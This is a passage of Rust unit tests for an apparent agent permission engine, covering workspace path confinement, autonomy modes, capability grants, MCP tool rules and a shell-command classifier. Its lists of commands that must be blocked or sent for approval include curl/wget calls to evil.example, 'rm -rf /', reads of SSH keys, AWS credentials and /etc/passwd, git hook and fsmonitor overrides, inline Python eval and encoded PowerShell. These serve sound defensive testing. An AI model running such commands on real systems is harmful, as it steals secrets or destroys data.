        // (b) Explicit relative `Deny` rule (`secrets/*`) MUST block ABSOLUTE path `<ws>/secrets/key.pem`!
        let abs_secret = ws.join("secrets").join("key.pem");
        let abs_secret_req = make_req("read_file", "read", Some(&abs_secret.to_string_lossy()));
        let abs_res = engine.evaluate_request(&abs_secret_req);
        assert_eq!(abs_res.effect, PolicyEffect::Deny);
        assert!(abs_res.matched_rule_id.is_some());

        // Safe relative path with `./` inside workspace resolves cleanly and is allowed.
        let ok_rel = make_req("read_file", "read", Some("./docs/./readme.md"));
        assert_eq!(engine.evaluate_request(&ok_rel).effect, PolicyEffect::Allow);

        // (c) Windows drive-relative (`C:foo.txt`), remote URI, and UNC paths MUST be rejected!
        if cfg!(windows) {
            assert!(resolve_within_workspace(&ws, "C:foo.txt").is_err());
            assert!(resolve_within_workspace(&ws, r"\Windows\System32").is_err());
            assert!(resolve_within_workspace(&ws, r"\\attacker\share\file.txt").is_err());
        }
        assert!(resolve_within_workspace(&ws, "https://evil.example/x").is_err());
        assert_eq!(
            resolve_within_workspace(&ws, "./docs/./readme.md").expect("clean rel"),
            "docs/readme.md"
        );

        let _ = fs::remove_dir_all(&ws);
        let _ = fs::remove_dir_all(&outside);
    }

    #[test]
    #[expect(
        clippy::too_many_lines,
        reason = "verifies Auto vs FullAccess, safe local shell, compound shell escape guard, A8 web search, and workspace escape blocking"
    )]
    fn autonomy_mode_evaluates_grants_shell_guards_and_blocks_workspace_escape() {
        let ws = temp_workspace("grants");
        let outside = temp_workspace("grants-outside");
        let project_id = ProjectId::new();
        let agent_id = AgentId::new();
        let session_id = SessionId::new();
        let now = TimestampMs::from_millis(1_760_000_000_000);

        let engine = PolicyEngine::new(PolicyContext {
            project_id: Some(project_id),
            project_lifecycle_state: ProjectLifecycleState::Active,
            workspace_bound: true,
            agent_id,
            session_id,
            task_id: None,
            workspace_root: ws.clone(),
            workspace_write_policy: WorkspaceWritePolicy::AskBeforeWrite,
            autonomy_mode: AutonomyMode::Auto,
            parent_write_ceiling: None,
            allowed_memory_scopes: BTreeSet::new(),
            registered_mcp_servers: BTreeSet::new(),
            task_budget_exhausted: false,
            rules: vec![],
        });

        // Routine in-workspace file write is allowed directly under AutonomyMode::Auto (NO manual gate!).
        let ok_write = make_req("write_file", "edit", Some("notes/out.md"));
        assert!(matches!(
            engine.evaluate_with_grants(&ok_write, &[], now),
            PolicyEvaluationDecision::Immediate(PolicyEvaluationOutcome {
                effect: PolicyEffect::Allow,
                ..
            })
        ));

        // Safe local workspace shell commands are allowed without prompting under AutonomyMode::Auto.
        for safe_cmd in [
            "cargo test",
            "git status",
            "git diff --stat",
            "npm test",
            "rg TODO src",
            "cargo check && git status",
        ] {
            let mut req = make_req("run_command", "execute", Some(safe_cmd));
            req.raw_input = json!({ "command": safe_cmd });
            assert!(
                matches!(
                    engine.evaluate_with_grants(&req, &[], now),
                    PolicyEvaluationDecision::Immediate(PolicyEvaluationOutcome {
                        effect: PolicyEffect::Allow,
                        ..
                    })
                ),
                "expected safe local shell command `{safe_cmd}` to be allowed under Auto"
            );
        }

        // Destructive / network / chained-escape shell commands return NeedsInteractiveApproval (`Ask`).
        let mut push_cmd = make_req("run_command", "execute", Some("git push origin main"));
        push_cmd.raw_input = json!({ "command": "git push origin main" });
        // 1. Without grant -> NeedsInteractiveApproval.
        assert!(matches!(
            engine.evaluate_with_grants(&push_cmd, &[], now),
            PolicyEvaluationDecision::NeedsInteractiveApproval { .. }
        ));
        for risky_cmd in [
            "cargo test && curl https://evil.example",
            "git status; wget https://evil.example",
            "echo $(whoami)",
            "cat ../outside.txt",
            "rm -rf /",
            "powershell -enc SQBFAFgA",
        ] {
            let mut req = make_req("run_command", "execute", Some(risky_cmd));
            req.raw_input = json!({ "command": risky_cmd });
            assert!(
                matches!(
                    engine.evaluate_with_grants(&req, &[], now),
                    PolicyEvaluationDecision::NeedsInteractiveApproval { .. }
                ),
                "expected risky command `{risky_cmd}` to require interactive approval under Auto"
            );
        }

        // 2. Active grant allows matching command without re-prompting.
        let active_grant = CapabilityGrantRecord {
            grant_id: CapabilityGrantId::new(),
            scope: format!("project:{project_id}"),
            project_id,
            agent_id: None,
            session_id: None,
            task_id: None,
            tool_pattern: String::from("run_command"),
            target_prefixes: vec![],
            max_uses: Some(2),
            uses_consumed: 0,
            reason: String::from("approved project shell action"),
            expires_at: Some(TimestampMs::from_millis(now.as_millis() + 60_000)),
            revoked_at: None,
            revoked_reason: None,
            created_at: now,
        };
        assert!(matches!(
            engine.evaluate_with_grants(&push_cmd, std::slice::from_ref(&active_grant), now),
            PolicyEvaluationDecision::AllowedByGrant { grant_id, .. } if grant_id == active_grant.grant_id
        ));

        // 3. Even with wide active grant, workspace escape is IMMEDIATELY Denied before grant check!
        let escape_write = make_req(
            "write_file",
            "edit",
            Some(&outside.join("escape.txt").to_string_lossy()),
        );
        assert!(matches!(
            engine.evaluate_with_grants(&escape_write, std::slice::from_ref(&active_grant), now),
            PolicyEvaluationDecision::Immediate(PolicyEvaluationOutcome {
                effect: PolicyEffect::Deny,
                ..
            })
        ));

        // 4. Revoked grant MUST NOT authorize!
        let mut revoked_grant = active_grant.clone();
        revoked_grant.revoked_at = Some(now);
        assert!(matches!(
            engine.evaluate_with_grants(&push_cmd, &[revoked_grant], now),
            PolicyEvaluationDecision::NeedsInteractiveApproval { .. }
        ));

        // 5. Expired grant MUST NOT authorize!
        let mut expired_grant = active_grant.clone();
        expired_grant.expires_at = Some(now);
        assert!(matches!(
            engine.evaluate_with_grants(&push_cmd, &[expired_grant], now),
            PolicyEvaluationDecision::NeedsInteractiveApproval { .. }
        ));

        // 6. Exhausted max_uses grant MUST NOT authorize!
        let mut exhausted_grant = active_grant;
        exhausted_grant.uses_consumed = 2;
        assert!(matches!(
            engine.evaluate_with_grants(&push_cmd, &[exhausted_grant], now),
            PolicyEvaluationDecision::NeedsInteractiveApproval { .. }
        ));

        // 7. AutonomyMode::FullAccess allows shell commands, external ops, and trusted MCPs without asking,
        //    while still blocking workspace escapes!
        let full_engine = PolicyEngine::new(PolicyContext {
            project_id: Some(project_id),
            project_lifecycle_state: ProjectLifecycleState::Active,
            workspace_bound: true,
            agent_id,
            session_id,
            task_id: None,
            workspace_root: ws.clone(),
            workspace_write_policy: WorkspaceWritePolicy::AllowWorkspace,
            autonomy_mode: AutonomyMode::FullAccess,
            parent_write_ceiling: None,
            allowed_memory_scopes: BTreeSet::new(),
            registered_mcp_servers: BTreeSet::from([String::from("telegram")]),
            task_budget_exhausted: false,
            rules: vec![],
        });
        assert!(matches!(
            full_engine.evaluate_with_grants(&push_cmd, &[], now),
            PolicyEvaluationDecision::Immediate(PolicyEvaluationOutcome {
                effect: PolicyEffect::Allow,
                ..
            })
        ));
        let ext_send = make_req(
            "external_effect:send_email",
            "external_effect",
            Some("a@b.c"),
        );
        assert!(matches!(
            engine.evaluate_with_grants(&ext_send, &[], now),
            PolicyEvaluationDecision::NeedsInteractiveApproval { .. }
        ));
        assert!(matches!(
            full_engine.evaluate_with_grants(&ext_send, &[], now),
            PolicyEvaluationDecision::Immediate(PolicyEvaluationOutcome {
                effect: PolicyEffect::Allow,
                ..
            })
        ));
        let tg_send = make_req("mcp__telegram__send_message", "other", Some("@alice"));
        assert!(matches!(
            full_engine.evaluate_with_grants(&tg_send, &[], now),
            PolicyEvaluationDecision::Immediate(PolicyEvaluationOutcome {
                effect: PolicyEffect::Allow,
                ..
            })
        ));
        assert!(matches!(
            full_engine.evaluate_with_grants(&escape_write, &[], now),
            PolicyEvaluationDecision::Immediate(PolicyEvaluationOutcome {
                effect: PolicyEffect::Deny,
                ..
            })
        ));

        let _ = fs::remove_dir_all(&ws);
        let _ = fs::remove_dir_all(&outside);
    }

    #[test]
    fn d2_sec_02_allow_all_targets_percent_encoded_file_uri_and_parent_write_ceiling() {
        let ws = temp_workspace("d2-sec-02");
        fs::create_dir_all(ws.join("docs")).expect("docs");
        fs::create_dir_all(ws.join("secrets")).expect("secrets");

        let project_id = ProjectId::new();
        let allow_docs = PolicyRule {
            rule_id: PolicyRuleId::new(),
            scope: format!("project:{project_id}"),
            tool_name: String::from("write_file"),
            target_pattern: Some(String::from("docs/*")),
            effect: PolicyEffect::Allow,
            reason: String::from("allow writes inside docs only"),
            created_at: TimestampMs::now(),
        };

        let engine = PolicyEngine::new(PolicyContext {
            project_id: Some(project_id),
            project_lifecycle_state: ProjectLifecycleState::Active,
            workspace_bound: true,
            agent_id: AgentId::new(),
            session_id: SessionId::new(),
            task_id: None,
            workspace_root: ws.clone(),
            workspace_write_policy: WorkspaceWritePolicy::AskBeforeWrite,
            autonomy_mode: AutonomyMode::Auto,
            parent_write_ceiling: Some(WorkspaceWritePolicy::AllowPaths {
                allowed_prefixes: vec![String::from("docs/safe")],
            }),
            allowed_memory_scopes: BTreeSet::new(),
            registered_mcp_servers: BTreeSet::new(),
            task_budget_exhausted: false,
            rules: vec![allow_docs],
        });

        // 1. Compound request with `docs/safe/a.txt` AND `secrets/key.pem`:
        //    MUST be denied by parent_write_ceiling AND must NEVER be allowed by `docs/*` rule!
        let mut compound = make_req("write_file", "edit", Some("docs/safe/a.txt"));
        compound.locations = vec![
            String::from("docs/safe/a.txt"),
            String::from("secrets/key.pem"),
        ];
        assert_eq!(
            engine.evaluate_request(&compound).effect,
            PolicyEffect::Deny
        );

        // 1b. Explicit `Allow` rule for `docs/*` on a non-file tool MUST require ALL targets to match!
        let allow_only_engine = PolicyEngine::new(PolicyContext {
            project_id: Some(project_id),
            project_lifecycle_state: ProjectLifecycleState::Active,
            workspace_bound: true,
            agent_id: AgentId::new(),
            session_id: SessionId::new(),
            task_id: None,
            workspace_root: ws.clone(),
            workspace_write_policy: WorkspaceWritePolicy::DenyAll,
            autonomy_mode: AutonomyMode::Auto,
            parent_write_ceiling: None,
            allowed_memory_scopes: BTreeSet::new(),
            registered_mcp_servers: BTreeSet::new(),
            task_budget_exhausted: false,
            rules: vec![PolicyRule {
                rule_id: PolicyRuleId::new(),
                scope: format!("project:{project_id}"),
                tool_name: String::from("write_file"),
                target_pattern: Some(String::from("docs/*")),
                effect: PolicyEffect::Allow,
                reason: String::from("allow writes inside docs only"),
                created_at: TimestampMs::now(),
            }],
        });
        let mut mixed_req = make_req("write_file", "edit", Some("docs/a.txt"));
        mixed_req.locations = vec![String::from("docs/a.txt"), String::from("src/escape.txt")];
        assert_eq!(
            allow_only_engine.evaluate_request(&mixed_req).effect,
            PolicyEffect::Deny,
            "D2-SEC-02: Allow rule MUST match ALL targets, never just ANY target!"
        );

        // 2. Parent write ceiling (`docs/safe`) MUST block `docs/other.txt` BEFORE project Allow rule or project CapabilityGrant!
        let broad_grant = CapabilityGrantRecord {
            grant_id: CapabilityGrantId::new(),
            scope: format!("project:{project_id}"),
            project_id,
            agent_id: None,
            session_id: None,
            task_id: None,
            tool_pattern: String::from("workspace_write"),
            target_prefixes: vec![],
            max_uses: None,
            uses_consumed: 0,
            reason: String::from("project-wide grant"),
            expires_at: None,
            revoked_at: None,
            revoked_reason: None,
            created_at: TimestampMs::now(),
        };
        let outside_ceiling = make_req("write_file", "edit", Some("docs/other.txt"));
        assert!(matches!(
            engine.evaluate_with_grants(
                &outside_ceiling,
                std::slice::from_ref(&broad_grant),
                TimestampMs::now()
            ),
            PolicyEvaluationDecision::Immediate(PolicyEvaluationOutcome {
                effect: PolicyEffect::Deny,
                ..
            })
        ));

        // 3. Inside parent ceiling (`docs/safe/ok.txt`) is allowed by the docs/* rule.
        let inside_ceiling = make_req("write_file", "edit", Some("docs/safe/ok.txt"));
        assert_eq!(
            engine.evaluate_request(&inside_ceiling).effect,
            PolicyEffect::Allow
        );

        // 4. Percent-encoded `file://` traversal (`%2e%2e`, `%2f`, `%00`, malformed `%`) MUST fail closed!
        let ws_uri = ws.to_string_lossy().replace('\\', "/");
        for bad_uri in [
            format!("file:///{ws_uri}/%2e%2e/escape.txt"),
            format!("file://localhost/{ws_uri}/docs/%2e%2e/%2e%2e/escape.txt"),
            format!("file:///{ws_uri}/docs/bad%00name.txt"),
            format!("file:///{ws_uri}/docs/bad%ZZ.txt"),
            format!("file:///{ws_uri}/docs/%5c..%5cescape.txt"),
        ] {
            assert!(
                resolve_within_workspace(&ws, &bad_uri).is_err(),
                "D2-SEC-02: expected percent-encoded traversal URI to be rejected: {bad_uri}"
            );
        }

        // 5. Archived & detached project lifecycle guards (D2-BUG-02).
        let archived_engine = PolicyEngine::new(PolicyContext {
            project_id: Some(project_id),
            project_lifecycle_state: ProjectLifecycleState::Archived,
            workspace_bound: true,
            agent_id: AgentId::new(),
            session_id: SessionId::new(),
            task_id: None,
            workspace_root: ws.clone(),
            workspace_write_policy: WorkspaceWritePolicy::AllowWorkspace,
            autonomy_mode: AutonomyMode::Auto,
            parent_write_ceiling: None,
            allowed_memory_scopes: BTreeSet::new(),
            registered_mcp_servers: BTreeSet::new(),
            task_budget_exhausted: false,
            rules: vec![],
        });
        assert_eq!(
            archived_engine
                .evaluate_request(&make_req("read_file", "read", Some("docs/a.txt")))
                .effect,
            PolicyEffect::Deny
        );

        // 6. Control MCP Step 4b: chat allows same-project event creation, denies cross-project,
        //    and background `task_run` denies recursive `dennett_event_create` by default.
        let chat_ctrl_engine = PolicyEngine::new(PolicyContext {
            project_id: Some(project_id),
            project_lifecycle_state: ProjectLifecycleState::Active,
            workspace_bound: true,
            agent_id: AgentId::new(),
            session_id: SessionId::new(),
            task_id: None,
            workspace_root: ws.clone(),
            workspace_write_policy: WorkspaceWritePolicy::DenyAll,
            autonomy_mode: AutonomyMode::Auto,
            parent_write_ceiling: None,
            allowed_memory_scopes: BTreeSet::new(),
            registered_mcp_servers: BTreeSet::new(),
            task_budget_exhausted: false,
            rules: vec![],
        });
        let mut ok_evt = make_req("dennett_event_create", "other", None);
        ok_evt.raw_input = json!({ "title": "Reminder", "goal": "Check CI" });
        assert_eq!(
            chat_ctrl_engine.evaluate_request(&ok_evt).effect,
            PolicyEffect::Allow
        );

        let mut foreign_evt = make_req("dennett_event_create", "other", None);
        foreign_evt.raw_input = json!({ "project_id": ProjectId::new().to_string(), "title": "X" });
        assert_eq!(
            chat_ctrl_engine.evaluate_request(&foreign_evt).effect,
            PolicyEffect::Deny
        );

        let task_ctrl_engine = PolicyEngine::new(PolicyContext {
            project_id: Some(project_id),
            project_lifecycle_state: ProjectLifecycleState::Active,
            workspace_bound: true,
            agent_id: AgentId::new(),
            session_id: SessionId::new(),
            task_id: Some(TaskId::new()),
            workspace_root: ws.clone(),
            workspace_write_policy: WorkspaceWritePolicy::DenyAll,
            autonomy_mode: AutonomyMode::Auto,
            parent_write_ceiling: None,
            allowed_memory_scopes: BTreeSet::new(),
            registered_mcp_servers: BTreeSet::new(),
            task_budget_exhausted: false,
            rules: vec![],
        });
        assert_eq!(
            task_ctrl_engine.evaluate_request(&ok_evt).effect,
            PolicyEffect::Deny
        );

        // 7. External effects fail closed by default (D2-ARCH-03).
        let eff_req = make_req(
            "external_effect:send_webhook",
            "external_effect",
            Some("ops@example.test"),
        );
        assert_eq!(
            chat_ctrl_engine.evaluate_request(&eff_req).effect,
            PolicyEffect::Deny
        );

        let _ = fs::remove_dir_all(&ws);
    }

    #[test]
    fn standalone_session_policy_denies_fs_and_control_mcp_but_allows_own_memory_scope() {
        let scratch = temp_workspace("standalone");
        let standalone_scope = MemoryScope::try_new("chat:standalone").expect("scope");
        let engine = PolicyEngine::new(PolicyContext {
            project_id: None,
            project_lifecycle_state: ProjectLifecycleState::Detached,
            workspace_bound: false,
            agent_id: AgentId::new(),
            session_id: SessionId::new(),
            task_id: None,
            workspace_root: scratch.clone(),
            workspace_write_policy: WorkspaceWritePolicy::DenyAll,
            autonomy_mode: AutonomyMode::Auto,
            parent_write_ceiling: Some(WorkspaceWritePolicy::DenyAll),
            allowed_memory_scopes: BTreeSet::from([standalone_scope]),
            registered_mcp_servers: BTreeSet::new(),
            task_budget_exhausted: false,
            rules: vec![],
        });

        // File write and read must both fail closed on standalone sessions.
        assert_eq!(
            engine
                .evaluate_request(&make_req("write_file", "edit", Some("note.txt")))
                .effect,
            PolicyEffect::Deny
        );
        assert_eq!(
            engine
                .evaluate_request(&make_req("read_file", "read", Some("note.txt")))
                .effect,
            PolicyEffect::Deny
        );
        // Standalone reminders (without foreign project_id) are allowed; foreign project_id and delegation are denied!
        let mut ctrl = make_req("dennett_event_create", "other", None);
        ctrl.raw_input = json!({ "title": "Reminder", "goal": "Ping" });
        assert_eq!(engine.evaluate_request(&ctrl).effect, PolicyEffect::Allow);

        let mut foreign_ctrl = make_req("dennett_event_create", "other", None);
        foreign_ctrl.raw_input =
            json!({ "project_id": ProjectId::new().to_string(), "title": "Escape" });
        assert_eq!(
            engine.evaluate_request(&foreign_ctrl).effect,
            PolicyEffect::Deny
        );

        let delegate = make_req("dennett_delegate_task", "other", None);
        assert_eq!(
            engine.evaluate_request(&delegate).effect,
            PolicyEffect::Deny
        );

        // Agent's own standalone memory scope is allowed; project scope is denied.
        let mut ok_mem = make_req("memory_write_note", "other", None);
        ok_mem.raw_input = json!({ "scope": "chat:standalone", "title": "T", "body": "B" });
        assert_eq!(engine.evaluate_request(&ok_mem).effect, PolicyEffect::Allow);

        let mut foreign_mem = make_req("memory_write_note", "other", None);
        foreign_mem.raw_input = json!({ "scope": "project:secret", "title": "T", "body": "B" });
        assert_eq!(
            engine.evaluate_request(&foreign_mem).effect,
            PolicyEffect::Deny
        );

        let _ = fs::remove_dir_all(&scratch);
    }

    #[test]
    #[expect(
        clippy::too_many_lines,
        reason = "verifies A07/A08 policy and all D3 memory/control MCP tool names in one matrix test"
    )]
    fn d3_a07_a08_policy_enforces_native_subagents_budget_and_registered_mcp_servers() {
        let ws = temp_workspace("d3-a07-a08");
        let project_id = ProjectId::new();
        let scope_alpha = MemoryScope::try_new("project:alpha").expect("scope");

        let base_ctx = PolicyContext {
            project_id: Some(project_id),
            project_lifecycle_state: ProjectLifecycleState::Active,
            workspace_bound: true,
            agent_id: AgentId::new(),
            session_id: SessionId::new(),
            task_id: Some(TaskId::new()),
            workspace_root: ws.clone(),
            workspace_write_policy: WorkspaceWritePolicy::DenyAll,
            autonomy_mode: AutonomyMode::Auto,
            parent_write_ceiling: None,
            allowed_memory_scopes: BTreeSet::from([scope_alpha]),
            registered_mcp_servers: BTreeSet::from([String::from("docs-helper")]),
            task_budget_exhausted: false,
            rules: vec![],
        };

        // 1. Native subagent allowed in active project with remaining budget.
        let engine = PolicyEngine::new(base_ctx.clone());
        let sub_req = make_req("invoke_subagent", "other", Some("helper"));
        assert_eq!(
            engine.evaluate_request(&sub_req).effect,
            PolicyEffect::Allow
        );

        // 2. Native subagent DENIED when task budget is exhausted!
        let mut exhausted_ctx = base_ctx.clone();
        exhausted_ctx.task_budget_exhausted = true;
        let exhausted_engine = PolicyEngine::new(exhausted_ctx);
        assert_eq!(
            exhausted_engine.evaluate_request(&sub_req).effect,
            PolicyEffect::Deny
        );

        // 3. Explicit Deny rule overrides native subagent allow!
        let mut denied_sub_ctx = base_ctx.clone();
        denied_sub_ctx.rules.push(PolicyRule {
            rule_id: PolicyRuleId::new(),
            scope: format!("project:{project_id}"),
            tool_name: String::from("invoke_subagent"),
            target_pattern: None,
            effect: PolicyEffect::Deny,
            reason: String::from("subagents disabled in this project"),
            created_at: TimestampMs::now(),
        });
        assert_eq!(
            PolicyEngine::new(denied_sub_ctx)
                .evaluate_request(&sub_req)
                .effect,
            PolicyEffect::Deny
        );

        // 4. D3 control-mcp text cooperation tools allowed in active project (including task_run).
        for ctrl_tool in [
            "dennett_agent_send_message",
            "dennett_agent_list_messages",
            "dennett_delegate_task",
        ] {
            let mut req = make_req(ctrl_tool, "other", None);
            req.raw_input = json!({ "project_id": project_id.to_string() });
            assert_eq!(
                engine.evaluate_request(&req).effect,
                PolicyEffect::Allow,
                "expected {ctrl_tool} to be allowed in project"
            );
        }

        // 5. D3 memory MCP write & read tools match exact `dennett-memory-mcp` tool names and enforce explicit scope on writes.
        for write_tool in [
            "mcp_dennett-memory_memory_claim_create",
            "mcp_dennett-memory_memory_claim_supersede",
            "mcp_dennett-memory_memory_conflict_resolve",
            "mcp_dennett-memory_memory_document_write",
        ] {
            let mut ok_req = make_req(write_tool, "other", None);
            ok_req.raw_input = json!({ "scope": "project:alpha", "topic_key": "k" });
            assert_eq!(
                engine.evaluate_request(&ok_req).effect,
                PolicyEffect::Allow,
                "expected {write_tool} with authorized scope to be allowed"
            );
            let missing_scope = make_req(write_tool, "other", None);
            assert_eq!(
                engine.evaluate_request(&missing_scope).effect,
                PolicyEffect::Deny,
                "expected {write_tool} without scope to be denied"
            );
        }
        for read_tool in [
            "mcp_dennett-memory_memory_claim_lookup",
            "mcp_dennett-memory_memory_conflict_list",
            "mcp_dennett-memory_memory_document_read",
            "mcp_dennett-memory_memory_index_status",
        ] {
            let mut read_req = make_req(read_tool, "other", None);
            read_req.raw_input = json!({ "scope": "project:alpha" });
            assert_eq!(
                engine.evaluate_request(&read_req).effect,
                PolicyEffect::Allow,
                "expected {read_tool} to be allowed"
            );
        }
        for owner_only_tool in [
            "mcp_dennett-memory_memory_forget",
            "mcp_dennett-memory_memory_export",
            "mcp_dennett-memory_memory_import",
        ] {
            let mut denied_req = make_req(owner_only_tool, "other", None);
            denied_req.raw_input = json!({ "scope": "project:alpha" });
            assert_eq!(
                engine.evaluate_request(&denied_req).effect,
                PolicyEffect::Deny,
                "owner-only {owner_only_tool} must remain default-deny for agents"
            );
        }

        // 6. Active registered A08 MCP server allowed; unregistered server denied; Deny beats Allow!
        let reg_mcp = make_req("mcp__docs-helper__lookup", "other", None);
        assert_eq!(
            engine.evaluate_request(&reg_mcp).effect,
            PolicyEffect::Allow
        );

        let unreg_mcp = make_req("mcp__untrusted-srv__exec", "other", None);
        assert_eq!(
            engine.evaluate_request(&unreg_mcp).effect,
            PolicyEffect::Deny
        );

        let mut denied_mcp_ctx = base_ctx;
        denied_mcp_ctx.rules.push(PolicyRule {
            rule_id: PolicyRuleId::new(),
            scope: String::from("global"),
            tool_name: String::from("mcp__docs-helper__*"),
            target_pattern: None,
            effect: PolicyEffect::Deny,
            reason: String::from("blocked by owner policy"),
            created_at: TimestampMs::now(),
        });
        assert_eq!(
            PolicyEngine::new(denied_mcp_ctx)
                .evaluate_request(&reg_mcp)
                .effect,
            PolicyEffect::Deny
        );

        let _ = fs::remove_dir_all(&ws);
    }

    #[test]
    fn d3_standalone_chat_allows_dennett_skill_tools_while_denying_project_events() {
        let ws = temp_workspace("d3-standalone-skills");
        let standalone_ctx = PolicyContext {
            project_id: None,
            project_lifecycle_state: ProjectLifecycleState::Detached,
            workspace_bound: false,
            agent_id: AgentId::new(),
            session_id: SessionId::new(),
            task_id: None,
            workspace_root: ws.clone(),
            workspace_write_policy: WorkspaceWritePolicy::DenyAll,
            autonomy_mode: AutonomyMode::Auto,
            parent_write_ceiling: None,
            allowed_memory_scopes: BTreeSet::new(),
            registered_mcp_servers: BTreeSet::new(),
            task_budget_exhausted: false,
            rules: Vec::new(),
        };
        let engine = PolicyEngine::new(standalone_ctx.clone());

        for skill_tool in [
            "dennett_skill_list",
            "dennett_skill_read",
            "mcp__dennett-control__dennett_skill_read",
        ] {
            let mut req = make_req(skill_tool, "read", None);
            req.raw_input = json!({ "slug": "rust-guide" });
            assert_eq!(
                engine.evaluate_request(&req).effect,
                PolicyEffect::Allow,
                "expected standalone chat to allow `{skill_tool}`"
            );
        }

        // File-target spoofing under `dennett_skill_read` MUST still be rejected!
        let mut spoofed = make_req("dennett_skill_read", "read", Some("/etc/passwd"));
        spoofed.raw_input = json!({ "path": "/etc/passwd" });
        assert_eq!(engine.evaluate_request(&spoofed).effect, PolicyEffect::Deny);

        // Project-only delegation & messaging remain strictly DENIED in standalone chats!
        for project_tool in [
            "dennett_delegate_task",
            "dennett_agent_send_message",
            "dennett_agent_list",
            "dennett_task_send_signal",
        ] {
            let req = make_req(project_tool, "other", None);
            assert_eq!(
                engine.evaluate_request(&req).effect,
                PolicyEffect::Deny,
                "expected standalone chat to deny `{project_tool}`"
            );
        }

        // A8: Built-in web search/fetch tools MUST NOT be rejected as local fs reads!
        for web_tool in [
            ("web_search", "search"),
            ("search_web", "search"),
            ("web_fetch", "read"),
            ("fetch_url", "other"),
            ("google_search", "search"),
        ] {
            let mut req = make_req(web_tool.0, web_tool.1, Some("https://example.com"));
            req.raw_input = json!({ "query": "rust async" });
            assert_eq!(
                engine.evaluate_request(&req).effect,
                PolicyEffect::Allow,
                "A8: expected built-in web tool `{}` to be allowed",
                web_tool.0
            );
        }

        // A11: Third-party MCP tool CANNOT spoof a registered server via `title` alone!
        let mut title_spoof_ctx = standalone_ctx.clone();
        title_spoof_ctx
            .registered_mcp_servers
            .insert(String::from("docs-helper"));
        let mut spoofed_mcp = make_req("evil_unregistered_tool", "other", None);
        spoofed_mcp.title = String::from("docs-helper: safe lookup");
        assert_eq!(
            PolicyEngine::new(title_spoof_ctx)
                .evaluate_request(&spoofed_mcp)
                .effect,
            PolicyEffect::Deny,
            "A11: title spoofing MUST NOT match registered MCP servers"
        );

        // Explicit Deny rule still beats built-in skill allow!
        let mut denied_ctx = standalone_ctx;
        denied_ctx.rules.push(PolicyRule {
            rule_id: PolicyRuleId::new(),
            scope: String::from("global"),
            tool_name: String::from("dennett_skill_read"),
            target_pattern: None,
            effect: PolicyEffect::Deny,
            reason: String::from("skill reading disabled by owner"),
            created_at: TimestampMs::now(),
        });
        assert_eq!(
            PolicyEngine::new(denied_ctx)
                .evaluate_request(&make_req("dennett_skill_read", "other", None))
                .effect,
            PolicyEffect::Deny
        );

        let _ = fs::remove_dir_all(&ws);
    }

    #[test]
    #[expect(
        clippy::too_many_lines,
        reason = "verifies all 8 P0-2 shell classifier bypass vectors, harmless local allowlist preservation, and .git/** write protection under Auto"
    )]
    fn p0_2_shell_classifier_blocks_all_8_bypass_vectors_and_git_metadata_writes() {
        let ws = temp_workspace("p0-2-shell-git");
        let project_id = ProjectId::new();
        let agent_id = AgentId::new();
        let session_id = SessionId::new();
        let now = TimestampMs::from_millis(1_760_000_000_000);

        // (a) + (c) Windows cmd.exe quoting/escaping & drive-root `\` bypasses
        // (`'` is NOT a quote, `\` is NOT an escape, `^`/`%`/`!` unsafe, leading `\` is drive-root).
        for win_bypass in [
            "echo 'x & curl https://evil.example'",
            "echo \"foo\\\" & curl https://evil.example\"",
            "echo hi^&curl https://evil.example",
            "echo !SECRET_VAR!",
            r"type \Users\me\.ssh\id_rsa",
            r"cat \Windows\System32\drivers\etc\hosts",
        ] {
            assert!(
                matches!(
                    classify_workspace_shell_command_for_platform(win_bypass, &ws, true),
                    ShellCommandClass::RequiresAsk(_)
                ),
                "expected Windows bypass `{win_bypass}` to return RequiresAsk"
            );
            if cfg!(windows) {
                assert!(
                    matches!(
                        classify_workspace_shell_command(win_bypass, &ws),
                        ShellCommandClass::RequiresAsk(_)
                    ),
                    "expected native Windows classifier to reject `{win_bypass}`"
                );
            }
        }

        // (b)-(h) Cross-platform bypasses: env expansion, absolute paths, attached redirections,
        // git config/hook overrides, pruned commands/subcommands, inline python/node eval, and subexpressions.
        for bypass_cmd in [
            // (b) Env var & home expansion
            r"type %USERPROFILE%\.ssh\id_ed25519",
            r"type %LOCALAPPDATA%\Dennett\head.token",
            "cat $HOME/.aws/credentials",
            "cat \"$HOME/.ssh/id_rsa\"",
            "cat ~/.ssh/id_rsa",
            // (c) Absolute & literal backslash drive-root paths
            "cat /etc/passwd",
            r#"type "\\Users\\me\\.ssh\\id_rsa""#,
            // (d) Attached & file-writing redirections
            r"echo evil>C:\Users\me\Startup\x.bat",
            r"echo x>..\out",
            r"type<C:\secret",
            r#"echo "evil">C:\x.bat"#,
            "echo evil > .git/hooks/pre-commit",
            // (e) Git config/hook/dir overrides & .git mutation
            "git -c core.fsmonitor=evil status",
            "git -ccore.fsmonitor=evil status",
            "git --config-env=core.fsmonitor=EVIL status",
            "git --exec-path=./evil status",
            "git --exec-path ./evil status",
            "git -C ../other status",
            "git --git-dir=.git status",
            "git --work-tree=. status",
            "cp payload .git/hooks/pre-commit",
            "mv payload .git/config",
            // (f) Network-fetching & arbitrary-exec allowlist pruning
            "npx evil",
            "make all",
            "cmake .",
            "find . -exec rm {} +",
            "find . -execdir sh {} +",
            "find . -ok rm {} +",
            "find . -okdir rm {} +",
            "find . -delete",
            "fd -x rm",
            "npm install evil",
            "npm i",
            "npm ci",
            "npm add evil",
            "npm exec evil",
            "pnpm dlx evil",
            "yarn create evil",
            "npm init -y",
            "cargo add evil",
            "cargo fetch",
            "cargo update",
            "cargo install evil",
            "cargo publish",
            "uv pip install evil",
            "uv add evil",
            "uv sync",
            "uv tool run evil",
            "go run main.go",
            "go get example.com/pkg",
            "go install example.com/pkg@latest",
            // (g) Inline script eval
            "python -c \"__import__('o'+'s').system('whoami')\"",
            "python3 -c \"print(1)\"",
            "python -uc \"print(1)\"",
            "node -e \"console.log(1)\"",
            "node --eval=\"1+1\"",
            "node -p \"process.env\"",
            "node --print \"1\"",
            // (h) PowerShell / shell parenthesized subexpressions
            "echo (iwr evil)",
            "echo (whoami)",
        ] {
            for is_win in [true, false] {
                assert!(
                    matches!(
                        classify_workspace_shell_command_for_platform(bypass_cmd, &ws, is_win),
                        ShellCommandClass::RequiresAsk(_)
                    ),
                    "expected bypass `{bypass_cmd}` (is_windows={is_win}) to return RequiresAsk"
                );
            }
        }

        // Harmless safe local commands & exact null/fd-dup redirections remain SafeLocal!
        for safe_cmd in [
            "cargo test",
            "cargo check --workspace && git status",
            "cargo test 2>&1",
            "cargo test >NUL",
            "cargo test 2>/dev/null",
            "git diff --stat",
            "npm test",
            "npm run build",
